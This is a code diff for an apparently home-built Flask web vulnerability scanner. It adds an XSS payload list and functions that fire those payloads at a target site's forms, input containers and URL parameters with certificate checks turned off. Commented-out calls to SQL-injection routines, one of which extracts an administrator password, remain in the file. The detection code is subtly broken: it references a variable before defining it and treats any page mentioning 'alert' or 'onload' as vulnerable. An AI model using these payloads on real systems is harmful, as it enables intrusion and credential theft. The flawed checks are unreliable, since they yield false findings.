@@ -6,7 +6,7 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import time
 import random, re
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 from requests.exceptions import SSLError, ConnectionError
 from flask import Flask, request, jsonify, Response
 from flask_cors import CORS
@@ -96,6 +96,229 @@ def find_urls_to_test(url, base_url):
                 links.add(script.text)
 
     return links
+
+xss_payloads = [
+    "<script>alert('Hacked')</script>",
+    """><svg/onload=prompt(1)>"",
+    "<svg/onload=prompt(1)",
+    "<script>prompt.call`${1}`</script>",
+    "--!><svg/onload=prompt(1)",
+    "//prompt.ml%2f@⒕₨",
+    "vbscript:prompt(1)#{"action":1}",
+    """"><img src=1 onerror=alert(1)>""",
+    "p'rompt(1)",
+    "<svg><script>prompt&#40;1)</script>",
+    '"><script>alert(document.domain)</script>',
+    '" autofocus onfocus="alert(document.domain)',
+    "javascript:alert('XSS')",
+    "';alert('Hacked');//",
+    "'--><svg onload=alert()>",
+    " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
+    """ 1/*' or 1 or'" or 1 or"*//*" """,
+    """“ onclick=alert(1)//<button value=Click_Me ‘ onclick=alert(1)//> */ alert(1); /*""",
+    """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
+    """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
+    "<img src=x onerror=alert('Hacked')>",
+    "<svg/onload=alert('Hacked')>",
+    "'<script>alert('Hacked')</script>'",
+    "\"<script>alert('Hacked')</script>\""
+]
+
+def submit_xss_payloads_to_forms(url):
+    """
+    Submits XSS payloads to forms and containers on the target URL to detect XSS vulnerabilities.
+
+    Args:
+        url (str): The target URL where forms and containers will be analyzed and tested for XSS vulnerabilities.
+
+    Returns:
+        bool: Returns True if a vulnerability is found, False otherwise.
+
+    Description:
+        - Retrieves the page content for the specified URL using the `get_response` function.
+        - Extracts all forms and containers with input elements from the HTML using the `get_forms_and_inputs` function.
+        - If no forms or input containers are found, it prints a message and returns False.
+        - Iterates over all forms, prepares form data by injecting random XSS payloads into input fields, and submits the form.
+        - Depending on the form method (`POST` or `GET`), it sends the request and checks if the payload is reflected in the response.
+        - Repeats the process for containers with input elements (e.g., `<div>`, `<section>`).
+        - If an XSS vulnerability is found, it prints the payload and returns True.
+        - If no vulnerability is found after all forms and containers are tested, it returns False.
+    """
+    response = get_response(url)
+    if not response:
+        return False
+
+    forms_and_inputs = get_forms_and_inputs(response)
+    forms = forms_and_inputs.get('forms', [])
+    containers_with_inputs = forms_and_inputs.get('containers_with_inputs', [])
+    
+    if not forms and not containers_with_inputs:
+        print("[-] No forms or inputs found on the page.")
+        return False
+    
+    results = []
+
+    #print(f"Forms found: {len(forms)}")
+    #print(f"Containers with inputs found: {len(containers_with_inputs)}")
+
+    for form in forms:
+        action = form.get('action')
+        method = form.get('method', 'get').lower()
+        form_url = urljoin(url, action)
+
+        inputs = form.find_all('input')
+        form_data = {}
+        for input_tag in inputs:
+            input_name = input_tag.get('name')
+            if input_name:
+                form_data[input_name] = random.choice(xss_payloads)
+        
+        for payload in xss_payloads:
+            if method == 'post':
+                r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
+            else:
+                r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)
+
+            if payload in r.text:
+                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}" + Style.RESET_ALL)
+                results.append({"form_action": action, "payload": payload})
+
+    for container in containers_with_inputs:
+        inputs = container.find_all(['input', 'textarea', 'button'])
+        if not inputs:
+            continue
+
+        form_data = {}
+        for i, input_tag in enumerate(inputs):
+            input_name = input_tag.get('name') or f'temp_name_{i}'
+            form_data[input_name] = random.choice(xss_payloads)
+            results.append({"container": "input_container", "payload": payload})
+
+        #print(f"Prepared form data for container: {form_data}")
+
+        for payload in xss_payloads:
+            r = requests.get(url, params=form_data, verify=False, proxies=proxies)
+            if payload in r.text:
+                print(Fore.GREEN + f"[+] XSS vulnerability found in container with payload: {payload}")
+                return True
+
+    if not results:
+        print("[-] No XSS vulnerabilities found in forms or containers.")
+        
+    return results
+
+
+def get_forms_and_inputs(response, max_attempts=3):
+    """
+    Extracts forms and containers with input elements from the HTML response.
+
+    Args:
+        response (requests.Response): The HTTP response object containing the page content to be analyzed.
+        max_attempts (int, optional): The maximum number of attempts to retrieve forms and input elements 
+                                      if they are not found on the first try. Defaults to 3.
+
+    Returns:
+        dict: A dictionary with two keys:
+              - 'forms': A list of form elements found in the HTML.
+              - 'containers_with_inputs': A list of containers (div, section, article) that include input elements.
+
+    Description:
+        - Parses the HTML content from the provided response using BeautifulSoup.
+        - Searches for all `<form>` elements in the HTML.
+        - Additionally looks for containers (e.g., <div>, <section>, <article>) that have any `<input>`, 
+          `<textarea>`, or `<button>` elements within them.
+        - If no forms or containers with inputs are found, it retries the process up to `max_attempts` times, 
+          with a 1-second delay between each attempt.
+        - Returns a dictionary containing the list of forms and containers with input elements.
+    """
+    soup = BeautifulSoup(response.text, 'html.parser')
+
+    forms = soup.find_all('form')
+
+    containers_with_inputs = []
+    containers = soup.find_all(['div', 'section', 'article'])
+    for container in containers:
+        if container.find_all(['input', 'textarea', 'button']):
+            containers_with_inputs.append(container)
+
+    attempt = 1
+    while not forms and not containers_with_inputs and attempt <= max_attempts:
+        time.sleep(1)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+        containers_with_inputs = []
+        containers = soup.find_all(['div', 'section', 'article'])
+        for container in containers:
+            if container.find_all(['input', 'textarea', 'button']):
+                containers_with_inputs.append(container)
+        attempt += 1
+
+    result = {
+        'forms': forms,
+        'containers_with_inputs': containers_with_inputs
+    }
+    return result
+
+def exploit_xss_url(url):
+    """
+    Attempts to exploit a possible XSS vulnerability by injecting common XSS payloads into the URL.
+
+    Args:
+        url (str): The target URL where XSS payloads will be injected and tested.
+
+    Returns:
+        bool: Returns True if a vulnerability is found, False otherwise.
+
+    Description:
+        - Iterates over a predefined list of XSS payloads, injecting each one as a query parameter in the URL.
+        - Sends a GET request to the modified URL.
+        - Checks if the payload appears in the page content, which indicates a potential XSS vulnerability.
+        - Analyzes the HTML response for specific indicators of vulnerability, such as reflected error messages, 
+          JavaScript events like `alert`, `onerror`, or `onload`.
+        - If a vulnerability is found, it prints the payload and returns True.
+        - If an SSL error or request-related error occurs during the process, it handles the exception and prints an error message.
+        - If no vulnerability is found after all payloads are tested, it returns False.
+    """
+    results = []
+    
+    for payload in xss_payloads:
+        target_url = f"{url}?input={payload}"
+        try:
+            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
+            
+            if payload in r.text:
+                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}")
+                results.append({"payload": payload, "vulnerable": True})
+                continue
+
+            soup = BeautifulSoup(r.text, 'html.parser')
+            title = soup.title.string if soup.title else ""
+            if "error" in title.lower():
+                print(Fore.GREEN + f"[+] XSS vulnerability found in error message with payload: {payload}"+ Style.RESET_ALL)
+                results.append({"payload": payload, "vulnerable": True})
+                continue
+
+            error_message = soup.find('div', class_='message') or soup.find('div', class_='error')
+            if error_message and payload in error_message.text:
+                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
+                results.append({"payload": payload, "vulnerable": True})
+                continue
+
+            if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
+                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
+                results.append({"payload": payload, "vulnerable": True})
+                continue
+
+        except SSLError as e:
+            print(f"[-] SSL Error on {target_url}: {e}")
+        except requests.RequestException as e:
+            print(f"[-] Request error on {target_url}: {e}")
+
+    if results:
+        return results
+    else:
+        print("[-] No XSS vulnerabilities found in URL.")
+        return [{"payload": None, "vulnerable": False}]
 
 def exploit_database_version(url):
     """
@@ -410,53 +633,77 @@ def handle_scan():
         for test_url in urls_to_test:
             print(f"\n[+] Testing URL: {test_url}")
             
-            sqli_result = exploit_sqli(test_url)
-            num_col = exploit_sqli_column_number(test_url)
-            admin_found, admin_password = exploit_sqli_users_table(test_url)
-            db_version = exploit_database_version(test_url)
+            # sqli_result = exploit_sqli(test_url)
+            # num_col = exploit_sqli_column_number(test_url)
+            # admin_found, admin_password = exploit_sqli_users_table(test_url)
+            # db_version = exploit_database_version(test_url)
+            # xss_results = exploit_xss_url(test_url)
+            xss_form_vulnerabilities = submit_xss_payloads_to_forms(test_url)
             
-            if sqli_result:
-                results.append({
-                    "url": test_url,
-                    "payloads": sqli_result
-                })
+            # if sqli_result:
+            #     results.append({
+            #         "url": test_url,
+            #         "payloads": sqli_result
+            #     })
                 
-            if num_col:
-                print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
-                results.append({
-                    "url": test_url,
-                    "columns_detected": num_col
-                })
+            # if num_col:
+            #     print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
+            #     results.append({
+            #         "url": test_url,
+            #         "columns_detected": num_col
+            #     })
                 
-            if admin_found:
-                print(Fore.GREEN + f"[+] Se encontró la contraseña del administrador en {test_url}: {admin_password}.")
-                results.append({
-                    "url": test_url,
-                    "admin_password_found": True,
-                    "admin_password": admin_password
-                })
+            # if admin_found:
+            #     print(Fore.GREEN + f"[+] Se encontró la contraseña del administrador en {test_url}: {admin_password}.")
+            #     results.append({
+            #         "url": test_url,
+            #         "admin_password_found": True,
+            #         "admin_password": admin_password
+            #     })
                 
-            if db_version:
-                print(Fore.GREEN + f"[+] Database version found: {db_version} for {test_url}")
-                results.append({
-                    "url": test_url,
-                    "database_version_found": True,
-                    "database_version": db_version
-                })
+            # if db_version:
+            #     print(Fore.GREEN + f"[+] Database version found: {db_version} for {test_url}")
+            #     results.append({
+            #         "url": test_url,
+            #         "database_version_found": True,
+            #         "database_version": db_version
+            #     })
+                
+            # if xss_results:
+            #     for result in xss_results:
+            #         if result["vulnerable"]:
+            #             print(Fore.GREEN + f"[+] XSS vulnerability found with payload: {result['payload']}")
+            #             results.append({
+            #                 "url": test_url,
+            #                 "xss_vulnerability_found": True,
+            #                 "xss_payload": result["payload"]
+            #             })
+            
+            if xss_form_vulnerabilities:
+                for form_vuln in xss_form_vulnerabilities:
+                    results.append({
+                        "url": test_url,
+                        "xss_form_vulnerability_found": True,
+                        "xss_form_payload": form_vuln["payload"]
+                    })
                 
             else:
                 print("[-] URL not vulnerable to SQL injection")
             
         return jsonify({
-            "status_messages": status_messages,
-            "sql_vulnerabilities_found": any('payloads' in result for result in results),
-            "columns_detected_found": any('columns_detected' in result for result in results),
-            "admin_password_found": any('admin_password_found' in result for result in results),
-            "database_version_found": any('database_version_found' in result for result in results),
-            "sql_injection_results": [r for r in results if 'payloads' in r],
-            "column_detection_results": [r for r in results if 'columns_detected' in r],
-            "admin_password_results": [r for r in results if 'admin_password_found' in r],
-            "database_version_results": [r for r in results if 'database_version_found' in r]
+            # "status_messages": status_messages,
+            # "sql_vulnerabilities_found": any('payloads' in result for result in results),
+            # "columns_detected_found": any('columns_detected' in result for result in results),
+            # "admin_password_found": any('admin_password_found' in result for result in results),
+            # "database_version_found": any('database_version_found' in result for result in results),
+            # "xss_vulnerabilities_found": any('xss_vulnerability_found' in result for result in results),
+            "xss_form_vulnerabilities_found": any('xss_form_vulnerability_found' in result for result in results),
+            # "sql_injection_results": [r for r in results if 'payloads' in r],
+            # "column_detection_results": [r for r in results if 'columns_detected' in r],
+            # "admin_password_results": [r for r in results if 'admin_password_found' in r],
+            # "database_version_results": [r for r in results if 'database_version_found' in r],
+            # "xss_results": [r for r in results if 'xss_vulnerability_found' in r],
+            "xss_form_results": [r for r in results if 'xss_form_vulnerability_found' in r]
         })
         
     else:
